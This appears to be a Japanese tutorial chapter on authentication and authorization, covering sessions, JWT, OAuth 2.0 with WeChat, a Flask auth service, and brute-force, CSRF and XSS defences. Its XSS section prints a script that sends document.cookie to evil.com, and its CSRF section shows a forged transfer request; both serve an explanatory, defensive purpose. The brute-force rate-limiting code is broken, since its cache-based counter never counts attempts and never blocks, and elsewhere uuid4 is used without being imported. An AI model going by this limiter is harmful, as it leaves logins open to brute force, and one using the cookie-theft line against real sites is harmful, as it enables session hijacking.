# 認証認可：セッション・JWT・OAuth2.0

> 💡 **学習ガイド**：この章では、バックエンドシステムの「ゲートキーパー」——認証と認可について深く理解します。「あなたは誰か」という基本から始め、Session、JWT、OAuth 2.0 などの最新の認証ソリューションを段階的に習得します。

<AuthEvolutionDemo />

## 0. はじめに：システムの「ゲートキーパー」

WeChatにログインした後、アプリを閉じて再度開いてもログイン状態が維持されるのはなぜでしょうか？
Bilibiliにアクセスしたとき、あなたがプレミアム会員か一般ユーザーかをどうやって判断しているのでしょうか？
WeChatのQRコードでサードパーティのWebサイトにログインするとき、なぜパスワードを入力する必要がないのでしょうか？

これらすべての背後には、**認証と認可 (Authentication & Authorization)** という中核システムがあります。

バックエンドシステムをビルに例えると：

- **認証 (Authentication)**：「あなたは誰か」を確認する（身分証明書やアクセスカードの確認）。
- **認可 (Authorization)**：「あなたがどこに行けるか」を確認する（VIPはVIPラウンジに入れるが、一般ユーザーは入れない）。

### 0.1 認証の動機

理由は一つだけです：**リソースを保護するため**。

- **プライバシー保護**：あなたの個人情報やチャット履歴は、あなただけが見ることができます。
- **権限制御**：管理者はユーザーを削除できますが、一般ユーザーはできません。
- **悪用防止**：悪意のある呼び出しやAPIの不正利用を防ぎます。

<AuthBasicsDemo />

### 0.2 インタラクティブデモ：ログインフロー

実際のログインデモを通じて、認証と認可がどのように機能するかを理解しましょう。

<AuthInteractiveLoginDemo />

**ポイント**：認証は最初の防御線です。すべての機密操作は、まず身元を確認する必要があります。

---

## 1. 基本概念：認証 vs 認可

### 1.1 認証 (Authentication)：あなたは誰か

ユーザーの身元を確認すること。

- _例_：ユーザー名とパスワードの入力、指紋認証、顔認証。
- _出力_：「あなた」を表すトークン（Token）。
- _英語略称_：**AuthN**

### 1.2 認可 (Authorization)：あなたは何ができるか

ユーザーがどのような権限を持っているかを確認すること。

- _例_：管理者は記事を削除でき、一般ユーザーは「いいね」しかできない。
- _出力_：アクセスの許可または拒否。
- _英語略称_：**AuthZ**

### 1.3 両者の関係

```
ユーザーリクエスト → 認証 (あなたは誰か？) → 認可 (あなたはそれができるか？) → ビジネスロジックの実行
           ↓                        ↓
      身元確認                権限チェック
      (Token 有効？)         (delete 権限がある？)
```

<AuthNvsAuthZDemo />

**ポイント**：まず認証、次に認可。「あなたは誰か」が確認できて初めて、「あなたが何ができるか」を判断できます。

---

## 2. ソリューションの進化史

### 2.1 第一世代：HTTP Basic Authentication

最も古いソリューションで、ユーザー名とパスワードを直接HTTPヘッダーに入れます。

```http
GET /api/user/profile HTTP/1.1
Host: example.com
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
                      (base64("username:password"))
```

- **利点**：シンプルで、すべてのブラウザがサポートしている。
- **欠点**：
  - 安全でない（Base64はデコード可能で、平文に相当）。
  - リクエストごとにパスワードを送信する必要がある（傍受されやすい）。
  - 能動的にログアウトできない（ブラウザを閉じる以外に方法がない）。

**結論**：内部テストツールのみに適しており、本番環境では絶対に使用しないこと。

### 2.2 第二世代：Session + Cookie

Web開発の古典的なソリューション。

**フロー**：

```
1. ユーザーログイン (POST /login)
   → サーバーがユーザー名とパスワードを検証
   → Sessionを作成（サーバーメモリまたはRedisに保存）
   → Set-Cookie: session_id=abc123 を返す

2. 後続のリクエスト
   → ブラウザが自動的に Cookie: session_id=abc123 を付与
   → サーバーが session_id に基づいて Session を検索
   → 見つかれば「あなたはあなたである」と認識
```

**コード例**：

```python
# バックエンド (Python Flask)
from flask import session, request

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    # ユーザー名とパスワードを検証
    user = db.authenticate(username, password)
    if user:
        # Sessionを作成
        session["user_id"] = user.id
        session["role"] = user.role
        return {"status": "success"}
    else:
        return {"error": "ユーザー名またはパスワードが間違っています"}, 401

@app.route("/api/admin/users")
def get_users():
    # Sessionをチェック
    if "user_id" not in session:
        return {"error": "ログインしていません"}, 401

    # 権限をチェック
    if session.get("role") != "admin":
        return {"error": "権限が不足しています"}, 403

    # ビジネスロジックを実行
    users = db.get_all_users()
    return {"users": users}
```

<SessionCookieDemo />

**利点**：

- シンプルで直感的、理解しやすい。
- サーバー側で能動的にログアウトできる（Sessionを削除）。

**欠点**：

- **サーバーに状態がある**：Sessionを保存する必要があり、複数サーバーでは共有が必要（Redisなど）。
- **クロスドメインが困難**：Cookieはデフォルトでクロスドメインに対応していない（CORSの問題）。
- **CSRF攻撃**：悪意のあるWebサイトがあなたのCookieを悪用できる。

**結論**：従来のWebアプリケーション（サーバーサイドレンダリング）に適しており、モバイルや最新のSPAには不向き。

### 2.3 第三世代：Token (JWT)

最新のWebの主流ソリューション。

**核心思想**：サーバー側に状態を保存せず、ユーザー情報をTokenに暗号化してクライアント側に保存する。

**JWTの構造**：

```
JWT = Header.Payload.Signature

例:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 |--------------------------------| |-----------------------------------------------| |----------------------------|
           Header                           Payload                                      Signature
```

- **Header**：アルゴリズム情報（例：`{"alg": "HS256", "typ": "JWT"}`）。
- **Payload**：ユーザー情報（例：`{"user_id": 123, "role": "admin", "exp": 1616239022}`）。
- **Signature**：署名（改ざん防止）。

**フロー**：

```python
# 1. ユーザーログイン
@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    user = db.authenticate(username, password)
    if user:
        # JWTを生成
        token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "exp": datetime.now() + timedelta(hours=24)  # 24時間で有効期限切れ
            },
            SECRET_KEY,
            algorithm="HS256"
        )
        return {"token": token}
    else:
        return {"error": "ユーザー名またはパスワードが間違っています"}, 401

# 2. 後続のリクエスト
@app.route("/api/admin/users")
def get_users():
    # HeaderからTokenを取得
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return {"error": "Tokenが提供されていません"}, 401

    token = auth_header.split(" ")[1]

    try:
        # Tokenを検証して解析
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return {"error": "Tokenの有効期限が切れています"}, 401
    except jwt.InvalidTokenError:
        return {"error": "Tokenが無効です"}, 401

    # 権限をチェック
    if payload.get("role") != "admin":
        return {"error": "権限が不足しています"}, 403

    # ビジネスロジックを実行
    users = db.get_all_users()
    return {"users": users}
```

<JWTWorkflowDemo />

**利点**：

- **ステートレス**：サーバー側でSessionを保存せず、水平スケーリングが容易。
- **クロスドメインに優しい**：Headerに入れるため、Cookieのクロスドメイン制限を受けない。
- **モバイルに優しい**：ネイティブアプリでも簡単に使用可能。
- **情報が豊富**：Payloadにユーザー情報や権限などを保存できる。

**欠点**：

- **能動的なログアウトができない**：Tokenは一度発行されると、有効期限が切れるまで有効（ブラックリストを使用しない限り）。
- **Payloadが可視**：Base64エンコードのため、機密情報（パスワードなど）を保存できない。
- **Tokenが大きい**：毎回のリクエストに付与する必要があり、数百バイトになる。

**結論**：最新のWebおよびモバイルの標準ソリューション。

<SessionVsJWTDemo />

---

## 3. OAuth 2.0：サードパーティログイン

「WeChatでログイン」「Googleでログイン」というボタンを見たことがあるでしょう。

これが **OAuth 2.0**：**認可**フレームワークです（認証ではありません！）。

### 3.1 主要な役割

| 役割                     | 説明                 | 例                    |
| :----------------------- | :------------------- | :-------------------- |
| **Resource Owner**       | リソース所有者（ユーザー） | あなた              |
| **Client**               | サードパーティアプリ | あるWebサイト         |
| **Authorization Server** | 認可サーバー         | WeChat、Google        |
| **Resource Server**      | リソースサーバー     | WeChatのユーザー情報API |

### 3.2 認可コードフロー (Authorization Code Flow)

最も安全なモードで、バックエンドを持つサーバーに適しています。

**フロー**：

```
1. ユーザーが「WeChatでログイン」をクリック
   → WeChatの認可ページにリダイレクト
   https://open.weixin.qq.com/connect/qrconnect?
     appid=APPID&
     redirect_uri=https://yourapp.com/callback&
     response_type=code&
     scope=snsapi_login&
     state=STATE

2. ユーザーがQRコードをスキャンして認可に同意
   → WeChatがあなたのWebサイトにリダイレクト
   https://yourapp.com/callback?code=AUTHORIZATION_CODE&state=STATE

3. あなたのバックエンドが code を使って access_token と交換
   POST https://api.weixin.qq.com/sns/oauth2/access_token
   {
     "appid": "APPID",
     "secret": "SECRET",
     "code": "AUTHORIZATION_CODE",
     "grant_type": "authorization_code"
   }
   → 返却: { "access_token": "...", "openid": "..." }

4. access_token を使ってユーザー情報を取得
   GET https://api.weixin.qq.com/sns/userinfo?
     access_token=ACCESS_TOKEN&
     openid=OPENID
   → 返却: { "nickname": "張三", "headimgurl": "..." }
```

<OAuth2FlowDemo />

**コード例**：

```python
from flask import request, redirect

@app.route("/login/wechat")
def login_wechat():
    # 1. WeChatの認可ページにリダイレクト
    auth_url = (
        "https://open.weixin.qq.com/connect/qrconnect"
        f"?appid={APPID}"
        f"&redirect_uri={urlencode(REDIRECT_URI)}"
        "&response_type=code"
        "&scope=snsapi_login"
        f"&state={generate_state()}"
    )
    return redirect(auth_url)

@app.route("/callback")
def wechat_callback():
    # 2. code を取得
    code = request.args.get("code")
    state = request.args.get("state")

    # state を検証（CSRF対策）
    if not verify_state(state):
        return {"error": "Invalid state"}, 400

    # 3. code を使って access_token と交換
    token_resp = requests.post(
        "https://api.weixin.qq.com/sns/oauth2/access_token",
        params={
            "appid": APPID,
            "secret": SECRET,
            "code": code,
            "grant_type": "authorization_code"
        }
    ).json()

    access_token = token_resp["access_token"]
    openid = token_resp["openid"]

    # 4. ユーザー情報を取得
    user_info = requests.get(
        "https://api.weixin.qq.com/sns/userinfo",
        params={
            "access_token": access_token,
            "openid": openid
        }
    ).json()

    # 5. ローカルでユーザーを作成または更新
    user = db.get_or_create_user(
        openid=openid,
        nickname=user_info["nickname"],
        avatar=user_info["headimgurl"]
    )

    # 6. 自システムのJWTを生成
    token = jwt.encode(
        {"user_id": user.id, "exp": ...},
        SECRET_KEY
    )

    return {"token": token}
```

**ポイント**：

- **code は一度しか使えない**：使用後は即座に無効になり、傍受を防ぐ。
- **state で CSRF 対策**：ランダムな文字列を生成し、コールバック時に検証して、悪意のあるWebサイトによる偽造を防ぐ。
- **redirect_uri は一致必須**：事前にWeChatオープンプラットフォームに登録し、リダイレクト攻撃を防ぐ。

### 3.3 その他のモード

| モード                              | 適用シーン                       | 安全性             |
| :---------------------------------- | :------------------------------- | :----------------- |
| **認可コードモード**                | バックエンドを持つサーバー       | ⭐⭐⭐⭐⭐         |
| **インプリシットモード (Implicit)** | 純粋なフロントエンドアプリ（SPA） | ⭐⭐⭐（非推奨）   |
| **パスワードモード (Resource Owner)** | 高度に信頼されたアプリ（公式Appなど） | ⭐⭐             |
| **クライアントクレデンシャルモード (Client Credentials)** | サーバー間通信（ユーザーなし） | ⭐⭐⭐⭐           |

<OAuth2ModesDemo />

---

## 4. 実践：完全な認証システムの設計

### 4.1 要件分析

- **マルチプラットフォーム対応**：Web、iOS、Android。
- **サードパーティログイン**：WeChat、Google。
- **権限制御**：一般ユーザー、VIP、管理者。
- **セキュリティ**：不正利用防止、ハイジャック防止、リプレイ攻撃防止。

### 4.2 アーキテクチャ設計

```
┌─────────────┐
│   クライアント │
└──────┬──────┘
       │
       ▼
┌─────────────────────────────────┐
│         API Gateway             │
│  - Rate Limiting (レート制限)    │
│  - Token Validation (トークン検証) │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│      Auth Service (認証サービス) │
│  - 登録、ログイン                │
│  - Token 発行と検証              │
│  - OAuth 2.0 統合                │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│    Business Services             │
│  - User Service                  │
│  - Order Service                 │
│  - Payment Service               │
└─────────────────────────────────┘
```

### 4.3 データベース設計

```sql
-- ユーザーテーブル
CREATE TABLE users (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,  -- bcrypt ハッシュ
    email VARCHAR(100) UNIQUE,
    role ENUM('user', 'vip', 'admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_username (username),
    INDEX idx_email (email)
);

-- サードパーティログインバインディングテーブル
CREATE TABLE user_auth_providers (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    user_id BIGINT NOT NULL,
    provider ENUM('wechat', 'google', 'github') NOT NULL,
    provider_user_id VARCHAR(100) NOT NULL,  -- サードパーティのユーザーID
    access_token TEXT,  -- 暗号化して保存
    refresh_token TEXT,
    expires_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY uk_provider_provider_user_id (provider, provider_user_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Token ブラックリスト（能動的ログアウト用）
CREATE TABLE token_blacklist (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    token_jti VARCHAR(100) UNIQUE NOT NULL,  -- JWT の JTI (一意識別子)
    expired_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_expired_at (expired_at)
);
```

<AuthDatabaseDemo />

### 4.4 コード実装

```python
# auth_service.py
import bcrypt
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key-here"  # 本番環境では環境変数を使用

class AuthService:
    def register(self, username: str, password: str, email: str = None):
        # 1. ユーザー名の重複をチェック
        if db.get_user_by_username(username):
            raise ValueError("ユーザー名は既に存在します")

        # 2. パスワードをハッシュ化（bcrypt）
        password_hash = bcrypt.hashpw(
            password.encode('utf-8'),
            bcrypt.gensalt(rounds=12)
        ).decode('utf-8')

        # 3. ユーザーを作成
        user = db.create_user(
            username=username,
            password_hash=password_hash,
            email=email
        )

        # 4. Token を発行
        return self._generate_tokens(user)

    def login(self, username: str, password: str):
        # 1. ユーザーを検索
        user = db.get_user_by_username(username)
        if not user:
            raise ValueError("ユーザー名またはパスワードが間違っています")

        # 2. パスワードを検証
        if not bcrypt.checkpw(
            password.encode('utf-8'),
            user.password_hash.encode('utf-8')
        ):
            raise ValueError("ユーザー名またはパスワードが間違っています")

        # 3. Token を発行
        return self._generate_tokens(user)

    def _generate_tokens(self, user):
        now = datetime.now()

        # Access Token (短期、例：1時間)
        access_token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "type": "access",
                "iat": now,
                "exp": now + timedelta(hours=1),
                "jti": str(uuid4())  # 一意識別子
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        # Refresh Token (長期、例：30日)
        refresh_token = jwt.encode(
            {
                "user_id": user.id,
                "type": "refresh",
                "iat": now,
                "exp": now + timedelta(days=30),
                "jti": str(uuid4())
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "token_type": "Bearer",
            "expires_in": 3600  # access_token の有効期限（秒）
        }

    def refresh(self, refresh_token: str):
        try:
            payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=["HS256"])
            if payload.get("type") != "refresh":
                raise ValueError("Invalid token type")

            user = db.get_user_by_id(payload["user_id"])
            return self._generate_tokens(user)
        except jwt.ExpiredSignatureError:
            raise ValueError("Refresh token の有効期限が切れています")
        except jwt.InvalidTokenError:
            raise ValueError("Refresh token が無効です")

    def logout(self, token: str):
        # Token をブラックリストに追加
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        db.add_to_blacklist(
            jti=payload["jti"],
            expired_at=datetime.fromtimestamp(payload["exp"])
        )

    def verify_token(self, token: str):
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

            # ブラックリストに含まれているかチェック
            if db.is_token_blacklisted(payload["jti"]):
                raise ValueError("Token はログアウト済みです")

            return payload
        except jwt.ExpiredSignatureError:
            raise ValueError("Token の有効期限が切れています")
        except jwt.InvalidTokenError:
            raise ValueError("Token が無効です")

# API デコレータ
def require_auth(auth_service: AuthService):
    def decorator(f):
        def wrapper(*args, **kwargs):
            # Header から Token を取得
            auth_header = request.headers.get("Authorization")
            if not auth_header or not auth_header.startswith("Bearer "):
                return {"error": "Token が提供されていません"}, 401

            token = auth_header.split(" ")[1]

            try:
                # Token を検証
                payload = auth_service.verify_token(token)
                # ユーザー情報をリクエストコンテキストに注入
                request.user = payload
                return f(*args, **kwargs)
            except ValueError as e:
                return {"error": str(e)}, 401

        return wrapper
    return decorator

def require_role(*roles):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if not hasattr(request, "user"):
                return {"error": "ログインしていません"}, 401

            if request.user["role"] not in roles:
                return {"error": "権限が不足しています"}, 403

            return f(*args, **kwargs)
        return wrapper
    return decorator

# 使用例
@app.route("/api/admin/users", methods=["GET"])
@require_auth(auth_service)
@require_role("admin")
def get_users():
    users = db.get_all_users()
    return {"users": users}

@app.route("/api/user/profile", methods=["GET"])
@require_auth(auth_service)
def get_profile():
    user = db.get_user_by_id(request.user["user_id"])
    return {"user": user}

@app.route("/auth/refresh", methods=["POST"])
def refresh_token():
    refresh_token = request.json.get("refresh_token")
    try:
        tokens = auth_service.refresh(refresh_token)
        return tokens
    except ValueError as e:
        return {"error": str(e)}, 401
```

<CompleteAuthSystemDemo />

---

## 5. セキュリティベストプラクティス

### 5.1 パスワードの保存

**❌ 誤った方法**：

```python
# 平文で保存（絶対にダメ！）
db.save_password(username, password)

# MD5 / SHA1 ハッシュ（十分に安全ではなく、レインボーテーブルで解読されやすい）
hash = md5(password)
db.save_password(username, hash)
```

**✅ 正しい方法**：

```python
# bcrypt（適応型ハッシュ、低速ハッシュでブルートフォース対策）
import bcrypt

password_hash = bcrypt.hashpw(
    password.encode('utf-8'),
    bcrypt.gensalt(rounds=12)  # rounds が大きいほど安全だが、遅くなる
)

# 検証
if bcrypt.checkpw(password.encode('utf-8'), password_hash):
    # パスワードが正しい
```

**なぜ bcrypt なのか？**

- **遅い**：意図的に遅く設計されており（ミリ秒単位）、ブルートフォース攻撃を防ぐ。
- **適応型**：rounds を調整でき、ハードウェアの進化に合わせて強化できる。
- **ソルト付き**：ランダムなソルトが組み込まれており、レインボーテーブルを防ぐ。

<PasswordHashingDemo />

### 5.2 ブルートフォース攻撃対策

- **レート制限**：同じ IP / ユーザー名で、1分間に5回までしか試行できない。
- **CAPTCHA**：3回失敗したらCAPTCHAの入力を要求。
- **アカウントロック**：10回失敗したらアカウントを30分間ロック。

```python
from functools import lru_cache
import time

@lru_cache(maxsize=10000)
def get_login_attempts(identifier: str) -> tuple:
    """(試行回数, 初回試行時刻) を返す"""
    return (0, 0)

def check_rate_limit(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    now = time.time()

    # 1分以内にリセット
    if now - first_attempt > 60:
        get_login_attempts.cache_clear()
        return True

    # 5回を超えたら拒否
    if attempts >= 5:
        return False

    return True

def record_login_attempt(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    if attempts == 0:
        first_attempt = time.time()
    get_login_attempts.cache_clear()
    get_login_attempts(identifier)  # 再キャッシュ

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]

    # レート制限をチェック
    if not check_rate_limit(username):
        return {"error": "試行回数が多すぎます。1分後にもう一度お試しください"}, 429

    password = request.json["password"]

    # パスワードを検証
    user = db.get_user_by_username(username)
    if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
        # ログイン成功、カウントをクリア
        get_login_attempts.cache_clear()
        return {"token": generate_token(user)}
    else:
        # ログイン失敗、記録
        record_login_attempt(username)
        return {"error": "ユーザー名またはパスワードが間違っています"}, 401
```

### 5.3 CSRF 対策 (Cross-Site Request Forgery)

**攻撃シナリオ**：
あなたが銀行のWebサイト `bank.com` にログインした後、悪意のあるWebサイト `evil.com` にアクセスしました。`evil.com` のページには次のようなコードが含まれています：

```html
<img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
```

あなたのブラウザは銀行のCookieを付けてこのリクエストを送信し（クロスドメインリクエスト）、資金が盗まれてしまいます。

**防御策**：

1.  **CSRF Token**：
    - サーバー側でランダムなTokenを生成し、フォームに埋め込む。
    - 送信時にTokenが一致するか検証する。

```python
from flask import session

@app.route("/api/transfer", methods=["POST"])
def transfer():
    # CSRF Token を検証
    token = request.headers.get("X-CSRF-Token")
    if token != session.get("csrf_token"):
        return {"error": "CSRF Token が無効です"}, 403

    # 送金を実行
    ...
```

2.  **SameSite Cookie**：
    - Cookie の `SameSite` 属性を `Strict` または `Lax` に設定する。

```python
# Flask の例
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',  # または 'Strict'
    SESSION_COOKIE_SECURE=True      # HTTPS のみ許可
)
```

3.  **JWT を使用する（Cookie を使わない）**：
    - JWT は `localStorage` に保存され、自動的に付与されないため、CSRF を自然に防ぐ。

<CSRFDefenseDemo />

### 5.4 XSS 対策 (Cross-Site Scripting)

**攻撃シナリオ**：
悪意のあるユーザーがコメント欄に次のように入力します：

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

Webサイトがこの内容を直接レンダリングすると、他のユーザーのCookieが盗まれてしまいます。

**防御策**：

1.  **出力エスケープ**：
    - `<` を `&lt;` に、`>` を `&gt;` に変換する。

```python
import html

def render_comment(comment):
    # HTML をエスケープ
    safe_comment = html.escape(comment)
    return f"<div class='comment'>{safe_comment}</div>"
```

2.  **Content Security Policy (CSP)**：
    - HTTP ヘッダーを設定し、スクリプトのソースを制限する。

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

3.  **HttpOnly Cookie**：
    - Cookie の `HttpOnly` 属性を設定し、JavaScript から読み取れないようにする。

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True
)
```

<XSSDefenseDemo />

---

## 6. まとめと学習ロードマップ

認証はバックエンドシステムの「基本スキル」であり、これを習得して初めて安全で信頼性の高いアプリケーションを構築できます。

### 6.1 主要な知識ポイント

| 知識ポイント          | 重要度     | 難易度 | 実践頻度 |
| :-------------------- | :--------- | :----- | :------- |
| **Session + Cookie**  | ⭐⭐⭐⭐   | 中     | 高       |
| **JWT**               | ⭐⭐⭐⭐⭐ | 低     | 非常に高 |
| **OAuth 2.0**         | ⭐⭐⭐⭐   | 高     | 高       |
| **パスワードハッシュ (bcrypt)** | ⭐⭐⭐⭐⭐ | 低     | 非常に高 |
| **レート制限とブルートフォース対策** | ⭐⭐⭐⭐⭐ | 中     | 非常に高 |
| **CSRF 防御**         | ⭐⭐⭐⭐   | 中     | 中       |
| **XSS 防御**          | ⭐⭐⭐⭐   | 低     | 高       |

### 6.2 学習ロードマップ

1.  **入門**（1〜2日）：
    - 認証 vs 認可を理解する。
    - Session + Cookie の原理を習得する。
    - 簡単なログイン登録機能を実装する。

2.  **応用**（1週間）：
    - JWT の原理と実装を学ぶ。
    - JWT ベースの認証システムを実装する。
    - パスワードハッシュ（bcrypt）を習得する。

3.  **実践**（2〜4週間）：
    - OAuth 2.0（WeChat、Google ログイン）を統合する。
    - レート制限、ブルートフォース攻撃対策を実装する。
    - CSRF、XSS などの一般的な攻撃を防御する。

4.  **深掘り**（継続的）：
    - RBAC（ロールベースアクセス制御）を学ぶ。
    - SSO（シングルサインオン）を研究する。
    - Zero Trust Architecture（ゼロトラストアーキテクチャ）を探求する。

### 6.3 推奨リソース

- **標準**：
  - RFC 6749 (OAuth 2.0)
  - RFC 7519 (JWT)
- **記事**：
  - JWT.io: https://jwt.io/
  - OAuth 2.0 簡体字中国語版: https://oauth.net/2/
- **ツール**：
  - jwt.io (JWT オンラインデバッグ)
  - Postman (API テスト)

---

## 7. 用語早見表 (Glossary)

| 用語              | 正式名称                    | 説明                                                                                   |
| :---------------- | :-------------------------- | :------------------------------------------------------------------------------------- |
| **AuthN**         | Authentication              | **認証**。「あなたは誰か」を確認する（パスワード入力による身元確認など）。             |
| **AuthZ**         | Authorization               | **認可**。「あなたが何ができるか」を確認する（管理者のみ削除可能など）。               |
| **Session**       | -                           | **セッション**。サーバー側に保存されたユーザーの状態情報。                             |
| **Cookie**        | -                           | **クッキー**。ブラウザに保存される小さなデータで、リクエストごとに自動的に送信される。 |
| **JWT**           | JSON Web Token              | **JSON Web トークン**。ステートレスな認証方式で、Header、Payload、Signature の3部構成。 |
| **OAuth 2.0**     | -                           | **オープン認可**。「WeChatでログイン」のようなサードパーティログインの標準化フレームワーク。 |
| **SSO**           | Single Sign-On              | **シングルサインオン**。一度ログインすれば複数のアプリにアクセス可能（Google アカウントで全 Google サービスにログインするなど）。 |
| **RBAC**          | Role-Based Access Control   | **ロールベースアクセス制御**。ユーザーのロール（admin、user など）に基づいて権限を決定する。 |
| **CSRF**          | Cross-Site Request Forgery  | **クロスサイトリクエストフォージェリ**。攻撃者がユーザーを誘導して悪意のあるリクエストを送信させる（Cookie を使って送金させるなど）。 |
| **XSS**           | Cross-Site Scripting        | **クロスサイトスクリプティング**。攻撃者がWebページに悪意のあるスクリプトを注入する（Cookie の盗難など）。 |
| **bcrypt**        | -                           | **パスワードハッシュアルゴリズム**。パスワード保存専用に設計された低速ハッシュアルゴリズムで、ブルートフォース攻撃を防ぐ。 |
| **Access Token**  | -                           | **アクセストークン**。短期有効のトークンで、API へのアクセスに使用する。               |
| **Refresh Token** | -                           | **リフレッシュトークン**。長期有効のトークンで、新しい Access Token を取得するために使用する。 |
| **Scope**         | -                           | **権限範囲**。OAuth 2.0 における概念で、サードパーティアプリが要求する権限（ユーザー情報の読み取りなど）を表す。 |
| **PKCE**          | Proof Key for Code Exchange | **認可コード交換の証明キー**。OAuth 2.0 の拡張で、パブリッククライアント（SPA など）のセキュリティを強化する。 |